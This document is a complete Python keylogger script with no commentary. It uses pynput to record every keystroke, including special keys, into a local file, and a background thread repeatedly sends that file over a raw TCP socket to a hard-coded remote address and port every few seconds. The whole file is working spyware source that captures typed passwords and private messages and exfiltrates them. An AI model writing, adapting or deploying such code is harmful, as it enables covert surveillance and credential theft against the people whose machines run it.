#!/usr/bin/env python3
from pynput.keyboard import Listener, Key
import socket
import threading
from time import sleep

RHOST = "192.168.1.134"
RPORT = 9000
PERIOD = 3
FILENAME = "keylogs.txt"

def on_press(key):
    f = open(FILENAME,"a+")
    try:
        f.write(key.char)
    except AttributeError:
        if key == Key.space:
            f.write(" ")
        elif key == Key.enter:
            f.write("\n")
        elif key == Key.tab:
            f.write("\t")
        elif key == Key.backspace:
            f.write("[bs]")
        else:
            f.write("["+key.name+"]")
    except TypeError:
        f.write("["+str(key)+"]")
    finally:
        f.close()

def listener():
    with Listener(on_press=on_press) as listener:
        listener.join()

def sender():
    while True:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        try:
            s.connect((RHOST,RPORT))
            f = open(FILENAME,"rb")
            data = f.read()
            f.close()
            s.send(data)
            s.close()
            sleep(PERIOD)
        except:
            sleep(1)
            continue


if __name__ == "__main__":
    listen = threading.Thread(target=listener)
    send = threading.Thread(target=sender)
    listen.start()
    send.start()
